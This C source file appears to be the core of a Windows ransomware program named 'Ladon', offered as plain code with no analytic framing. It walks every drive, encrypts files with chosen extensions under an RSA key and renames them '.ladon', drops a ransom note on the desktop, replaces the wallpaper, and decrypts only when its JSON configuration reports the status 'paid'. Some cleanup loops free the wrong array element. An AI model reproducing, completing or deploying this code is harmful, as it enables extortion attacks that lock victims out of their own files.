#include "ladon.h"
#ifndef _WIN64

_declspec(naked) void _chkstk(unsigned int p1)
{
	__asm {
		cmp    eax, 0x1000
		jnb    probesetup

		neg    eax
		add    eax, esp
		add    eax, 4
		test[eax], eax
		xchg    eax, esp
		mov    eax, [eax]
		push    eax
		retn

		probesetup :
		push    ecx
			lea    ecx, [esp + 8]

			probepages :
			sub    ecx, 0x1000
			sub    eax, 0x1000
			test[ecx], eax
			cmp    eax, 0x1000
			jnb    probepages

			sub    ecx, eax
			mov    eax, esp
			test[ecx], eax
			mov    esp, ecx
			mov    ecx, [eax]
			mov    eax, [eax + 4]
			push eax
			retn
	}
}

#endif
int __CmpStrW(LPCWSTR s1, LPCWSTR s2)
{
	while (*s1 == *s2++)
	{
		if (*s1++ == 0)
			return 0;
	}

	return (*(PDWORD)s1 - *(PDWORD) --s2);
}
#define LADON_MAX_DRIVE_LENGTH 4096

HCRYPTKEY ghPrivateKeyRSA = 0, ghPublicKeyRSA = 0;

BOOL LadonDoDecrypt(char *json_str);

typedef struct LADON_SCAN_CONTEXT {
	LPWSTR *lpszBlacklist;
	LPWSTR *lpszExts;
} LADON_SCAN_CONTEXT;

/* only use these if the function signatures of the encrypt
* and decrypt functions are different from below */
BOOL
LadonEncryptCryptoFunc(LPWSTR lpszPath)
{
	WCHAR lpszNewPath[MAX_PATH];
	_wsprintfW(lpszNewPath, L"%s.ladon", lpszPath);

	LadonEncryptFile(ghPublicKeyRSA, lpszPath, lpszNewPath);

	return FALSE;
}

BOOL
LadonDecryptCryptoFunc(LPWSTR lpszPath)
{
	WCHAR lpszNewPath[MAX_PATH];
	LPWSTR lpszExt;

	_wsprintfW(lpszNewPath, L"%s", lpszPath);

	lpszExt = _PathFindExtensionW(lpszNewPath);
	*lpszExt = '\0';

	LadonDecryptFile(ghPrivateKeyRSA, lpszPath, lpszNewPath);

	return FALSE;
}

BOOL
LadonScanFolder(LPWSTR lpszDir, LPWSTR *lpszExts, DWORD dwNumExts,
	LPWSTR *lpszBlacklist, DWORD dwNumBlacklist, BOOL(*pfOnFindFile)(LPWSTR))
{
	HANDLE hFind;
	WIN32_FIND_DATAW wFindData;
	WCHAR lpszPath[MAX_PATH];
	WCHAR lpszBlacklistTemp[MAX_PATH];
	BOOL bStatus = FALSE;

	_wsprintfW(lpszPath, L"%s\\*", lpszDir);
	if (!(hFind = _FindFirstFileW(lpszPath, &wFindData)))
		goto end_fail;

	do
	{
		if (wFindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			if (!__CmpStrW(wFindData.cFileName, L".") || !__CmpStrW(wFindData.cFileName, L".."))
				continue;

			_wsprintfW(lpszPath, L"%s\\%s", lpszDir, wFindData.cFileName);

			for (DWORD dwIndex = 0; dwIndex < dwNumBlacklist; dwIndex++)
			{
				_wsprintfW(lpszBlacklistTemp, L"%c:\\%s", lpszDir[0], lpszBlacklist[dwIndex]);

				if (!__CmpStrW(lpszPath, lpszBlacklistTemp))
					goto scan_next_file;
			}

			LadonScanFolder(lpszPath, lpszExts, dwNumExts,
				lpszBlacklist, dwNumBlacklist, pfOnFindFile);
		}
		else
		{
			for (DWORD dwIndex = 0; dwIndex < dwNumExts; dwIndex++)
			{
				if (!__CmpStrW(_PathFindExtensionW(wFindData.cFileName), lpszExts[dwIndex]))
				{
					_wsprintfW(lpszPath, L"%s\\%s", lpszDir, wFindData.cFileName);
					(*pfOnFindFile)(lpszPath);
					break;
				}
			}
		}

	scan_next_file:
		;
	} while (_FindNextFileW(hFind, &wFindData));

	bStatus = _GetLastError() != ERROR_NO_MORE_FILES;

	FindClose(hFind);

end_fail:
	return bStatus;
}

VOID
LadonScanDrives(BOOL(*pfOnFindDrive)(LPWSTR, LPVOID), LPVOID lpParam)
{
	WCHAR lpszVolumeName[LADON_MAX_DRIVE_LENGTH];
	WCHAR lpszVolumeNameBuff[] = L"?:";
	LPWSTR lpszVolumeNameTemp = lpszVolumeName;

	if (_GetLogicalDriveStringsW(MAX_PATH, lpszVolumeName))
	{
		while (*lpszVolumeNameTemp)
		{
			lpszVolumeNameBuff[0] = lpszVolumeNameTemp[0];

			(*pfOnFindDrive)(lpszVolumeNameBuff, lpParam);

			lpszVolumeNameTemp += _lstrlenW(lpszVolumeNameTemp) + 1;
		}
	}
}

BOOL
LadonOnFindDrive_Encrypt(LPWSTR lpszDriveName, LPVOID lpParam)
{
	LADON_SCAN_CONTEXT *plscContext = (LADON_SCAN_CONTEXT *)lpParam;
	DWORD dwNumExts = 0;
	DWORD dwNumBlacklist = 0;

	for (LPWSTR *lpszExt = plscContext->lpszExts; *lpszExt; lpszExt++)
		dwNumExts++;

	for (LPWSTR *lpszBlacklist = plscContext->lpszBlacklist; *lpszBlacklist; lpszBlacklist++)
		dwNumBlacklist++;

	LadonScanFolder(lpszDriveName, plscContext->lpszExts, dwNumExts,
		plscContext->lpszBlacklist, dwNumBlacklist, LadonEncryptCryptoFunc);
	return TRUE;
}

BOOL
LadonOnFindDrive_Decrypt(LPWSTR lpszDriveName, LPVOID lpParam)
{
	LADON_SCAN_CONTEXT *plscContext = (LADON_SCAN_CONTEXT *)lpParam;
	DWORD dwNumExts = 0;
	DWORD dwNumBlacklist = 0;

	for (LPWSTR *lpszExt = plscContext->lpszExts; *lpszExt; lpszExt++)
		dwNumExts++;

	for (LPWSTR *lpszBlacklist = plscContext->lpszBlacklist; *lpszBlacklist; lpszBlacklist++)
		dwNumBlacklist++;

	LadonScanFolder(lpszDriveName, plscContext->lpszExts, dwNumExts,
		plscContext->lpszBlacklist, dwNumBlacklist, LadonDecryptCryptoFunc);
	return TRUE;
}

BOOL Background(BYTE* data, DWORD dataLen) {
	DWORD dwWritten = 0;
	HANDLE file = _CreateFileW(L"image.png", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	_WriteFile(file, data, dataLen, &dwWritten, 0);
	_CloseHandle(file);

	_SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, L"image.png", SPIF_SENDCHANGE);

	return TRUE;
}

DWORD hex2bin(char*src, int srclen, BYTE *dest) {
	DWORD len = srclen / 2;
	_CryptStringToBinary(src, srclen, CRYPT_STRING_HEX, dest, &len, 0, 0);
	return len;
}

int LadonDoEncrypt(char *json_str)
{
	LADON_SCAN_CONTEXT lscContext;
	LPWSTR *lpszExts = NULL, *lpszDebug = NULL, *lpszBlacklist = NULL;
	DWORD dwNumDebug = 0, dwNumExts = 0, dwNumBlacklist = 0;
	int status = FALSE;
	json_object_t *root_obj;
	json_array_t *ext_arr;
	json_string_t *key_str;
	json_string_t *msg_str;
	json_string_t *img_str;
	json_string_t *status_str;
	json_array_t *debug_arr;
	json_array_t *blacklist_arr;
	json_string_t *contactid;
	WCHAR *cont = NULL;

	root_obj = (json_object_t *)json_parse(json_str);
	if (!(root_obj && (root_obj->type == JSON_OBJECT)))
		goto end_fail;

	if (!((key_str = (json_string_t *)hashmap_get(root_obj->value, "key", NULL))
		&& (msg_str = (json_string_t *)hashmap_get(root_obj->value, "message", NULL))
		&& (ext_arr = (json_array_t *)hashmap_get(root_obj->value, "extensions", NULL))
		&& (status_str = (json_string_t *)hashmap_get(root_obj->value, "status", NULL))
		&& (img_str = (json_string_t *)hashmap_get(root_obj->value, "image", NULL))
		&& (debug_arr = (json_array_t *)hashmap_get(root_obj->value, "debug", NULL))
		&& (blacklist_arr = (json_array_t *)hashmap_get(root_obj->value, "blacklist", NULL))

		&& (contactid = (json_string_t *)hashmap_get(root_obj->value, "contactid", NULL))
		))
		goto end_fail;

	if (!((key_str->type == JSON_STRING)
		&& (msg_str->type == JSON_STRING)
		&& (ext_arr->type == JSON_ARRAY)
		&& (status_str->type == JSON_STRING)
		&& (img_str->type == JSON_STRING)
		&& (debug_arr->type == JSON_ARRAY)
		&& (blacklist_arr->type == JSON_ARRAY)

		&& (contactid->type == JSON_STRING)
		))
		goto end_fail;

	if (_lstrcmp(status_str->value, "paid") == 0)
	{
		if (root_obj)
			json_free((json_item_t *)root_obj);
		LadonDoDecrypt(json_str);
		return TRUE;
	}
	if (!LadonCryptImportRSAPublicKey(&ghPublicKeyRSA, key_str->value))
		goto end_fail;

	
	if (*msg_str->value != '\0')
	{
		DropNoteDesktop(msg_str->value);
	}

	for (list_item_t *curr = ext_arr->value.head; curr; curr = curr->next)
	{
		dwNumExts++;
	}

	lpszExts = _HeapAlloc(_GetProcessHeap(), 0, (dwNumExts + 1) * sizeof(*lpszExts));
	if (!lpszExts)
		goto end_fail;

	dwNumExts = 0;

	for (list_item_t *curr = ext_arr->value.head; curr; curr = curr->next)
	{
		json_string_t *ext_str = (json_string_t *)curr->value;
		DWORD dwWstrLen = _MultiByteToWideChar(CP_ACP, 0, ext_str->value, -1, NULL, 0);

		lpszExts[dwNumExts] = (LPWSTR)_HeapAlloc(_GetProcessHeap(), 0, dwWstrLen * sizeof(WCHAR));
		if (!lpszExts[dwNumBlacklist])
			goto end_fail;

		_MultiByteToWideChar(CP_ACP, 0, ext_str->value, -1, lpszExts[dwNumExts++], dwWstrLen);
	}

	lpszExts[dwNumExts] = NULL;
	if (!_lstrcmp(img_str->value, "") == 0)
	{
		DWORD imglen = _lstrlen(img_str->value);
		BYTE *pby = (BYTE*)_HeapAlloc(_GetProcessHeap(), 0, imglen + 1);
		if (!pby)
			goto end_fail;

		hex2bin(img_str->value, imglen, pby);
		Background(pby, imglen);

		_HeapFree(_GetProcessHeap(), 0, pby);
	}

	for (list_item_t *curr = blacklist_arr->value.head; curr; curr = curr->next)
	{
		dwNumBlacklist++;
	}

	lpszBlacklist = _HeapAlloc(_GetProcessHeap(), 0, (dwNumBlacklist + 1) * sizeof(*lpszBlacklist));
	if (!lpszBlacklist)
		goto end_fail;

	dwNumBlacklist = 0;

	for (list_item_t *curr = blacklist_arr->value.head; curr; curr = curr->next)
	{
		json_string_t *blacklist_str = (json_string_t *)curr->value;
		DWORD dwWstrLen = _MultiByteToWideChar(CP_ACP, 0, blacklist_str->value, -1, NULL, 0);

		lpszBlacklist[dwNumBlacklist] = (LPWSTR)_HeapAlloc(_GetProcessHeap(), 0, dwWstrLen * sizeof(WCHAR));
		if (!lpszBlacklist[dwNumBlacklist])
			goto end_fail;

		_MultiByteToWideChar(CP_ACP, 0, blacklist_str->value, -1, lpszBlacklist[dwNumBlacklist++], dwWstrLen);
	}

	lpszBlacklist[dwNumBlacklist] = NULL;

	for (list_item_t *curr = debug_arr->value.head; curr; curr = curr->next)
	{
		dwNumDebug++;
	}

	lpszDebug = _HeapAlloc(_GetProcessHeap(), 0, (dwNumDebug + 1) * sizeof(*lpszDebug));
	if (!lpszDebug)
		goto end_fail;

	dwNumDebug = 0;

	for (list_item_t *curr = debug_arr->value.head; curr; curr = curr->next)
	{
		json_string_t *debug_str = (json_string_t *)curr->value;
		DWORD dwWstrLen = _MultiByteToWideChar(CP_ACP, 0, debug_str->value, -1, NULL, 0);

		lpszDebug[dwNumDebug] = (LPWSTR)_HeapAlloc(_GetProcessHeap(), 0, dwWstrLen * sizeof(WCHAR));
		if (!lpszDebug[dwNumDebug])
			goto end_fail;

		_MultiByteToWideChar(CP_ACP, 0, debug_str->value, -1, lpszDebug[dwNumDebug++], dwWstrLen);
	}

	lpszDebug[dwNumDebug] = NULL;

	DWORD contlen = _MultiByteToWideChar(CP_ACP, 0, contactid->value, -1, NULL, 0);

	cont = (LPWSTR)_HeapAlloc(_GetProcessHeap(), 0, contlen * sizeof(WCHAR));
	if (!cont)
		goto end_fail;

	_MultiByteToWideChar(CP_ACP, 0, contactid->value, -1, cont, contlen);

	lscContext.lpszBlacklist = lpszBlacklist;
	lscContext.lpszExts = lpszExts;
 	//LadonIsWindowOpen(lpszDebug, dwNumDebug);

	LadonScanDrives(LadonOnFindDrive_Encrypt, &lscContext);

	status = TRUE;
end_fail:
	if (ghPublicKeyRSA)
	{
		LadonCryptDestroyKey(ghPublicKeyRSA);
		ghPublicKeyRSA = 0;
	}

	if (root_obj)
		json_free((json_item_t *)root_obj);

	if (lpszExts)
	{
		for (DWORD dwIndex = 0; dwIndex < dwNumExts; dwIndex++)
		{
			_HeapFree(_GetProcessHeap(), 0, lpszExts[dwNumExts]);
		}

		_HeapFree(_GetProcessHeap(), 0, lpszExts);
	}

	if (lpszBlacklist)
	{
		for (DWORD dwIndex = 0; dwIndex < dwNumBlacklist; dwIndex++)
		{
			_HeapFree(_GetProcessHeap(), 0, lpszBlacklist[dwNumBlacklist]);
		}

		_HeapFree(_GetProcessHeap(), 0, lpszBlacklist);
	}

	if (lpszDebug)
	{
		for (DWORD dwIndex = 0; dwIndex < dwNumDebug; dwIndex++)
		{
			_HeapFree(_GetProcessHeap(), 0, lpszDebug[dwNumDebug]);
		}

		_HeapFree(_GetProcessHeap(), 0, lpszDebug);
	}
	if (cont) {
		_HeapFree(_GetProcessHeap(), 0, cont);
	}
	return status;
}

BOOL
LadonDoDecrypt(char *json_str)
{
	LADON_SCAN_CONTEXT lscContext;
	BOOL bStatus = FALSE;
	LPWSTR lpszExts[2] = { L".ladon", NULL }, *lpszBlacklist = NULL;
	DWORD dwNumBlacklist = 0;
	WCHAR *cont = NULL;
	json_object_t *root_obj;
	json_string_t *key_str;
	json_array_t *blacklist_arr;

	json_string_t *contactid;
	root_obj = (json_object_t *)json_parse(json_str);
	if (!(root_obj && (root_obj->type == JSON_OBJECT)))
		goto end_fail;

	if (!((key_str = (json_string_t *)hashmap_get(root_obj->value, "key", NULL))
		&& (blacklist_arr = (json_array_t *)hashmap_get(root_obj->value, "blacklist", NULL))
		&& (contactid = (json_string_t *)hashmap_get(root_obj->value, "contactid", NULL))
		))
		goto end_fail;

	for (list_item_t *curr = blacklist_arr->value.head; curr; curr = curr->next)
	{
		dwNumBlacklist++;
	}

	lpszBlacklist = _HeapAlloc(_GetProcessHeap(), 0, (dwNumBlacklist + 1) * sizeof(*lpszBlacklist));
	if (!lpszBlacklist)
		goto end_fail;

	dwNumBlacklist = 0;

	for (list_item_t *curr = blacklist_arr->value.head; curr; curr = curr->next)
	{
		json_string_t *blacklist_str = (json_string_t *)curr->value;
		DWORD dwWstrLen = _MultiByteToWideChar(CP_ACP, 0, blacklist_str->value, -1, NULL, 0);

		lpszBlacklist[dwNumBlacklist] = (LPWSTR) _HeapAlloc(_GetProcessHeap(), 0, dwWstrLen * sizeof(WCHAR));
		if (!lpszBlacklist[dwNumBlacklist])
			goto end_fail;

		_MultiByteToWideChar(CP_ACP, 0, blacklist_str->value, -1, lpszBlacklist[dwNumBlacklist++], dwWstrLen);
	}

	lpszBlacklist[dwNumBlacklist] = NULL;

	if (!LadonCryptImportRSAPrivateKey(&ghPrivateKeyRSA, key_str->value))
		goto end_fail;

	lscContext.lpszBlacklist = lpszBlacklist;
	lscContext.lpszExts = lpszExts;

	LadonScanDrives(LadonOnFindDrive_Decrypt, &lscContext);

	DWORD contlen = _MultiByteToWideChar(CP_ACP, 0, contactid->value, -1, NULL, 0);

	cont = (LPWSTR)_HeapAlloc(_GetProcessHeap(), 0, contlen * sizeof(WCHAR));
	if (!cont)
		goto end_fail;

	_MultiByteToWideChar(CP_ACP, 0, contactid->value, -1, cont, contlen);


	RemoveRegistry(L"love");
	bStatus = TRUE;
end_fail:
	if (ghPrivateKeyRSA) {
		LadonCryptDestroyKey(ghPrivateKeyRSA);
		ghPrivateKeyRSA = 0;
	}

	if (lpszBlacklist)
	{
		for (DWORD dwIndex = 0; dwIndex < dwNumBlacklist; dwIndex++)
		{
			_HeapFree(_GetProcessHeap(), 0, lpszBlacklist[dwNumBlacklist]);
		}

		_HeapFree(_GetProcessHeap(), 0, lpszBlacklist);
	}
	if (cont) {
		_HeapFree(_GetProcessHeap(), 0, cont);
	}
	if (root_obj)
		json_free((json_item_t *)root_obj);

	return bStatus;
}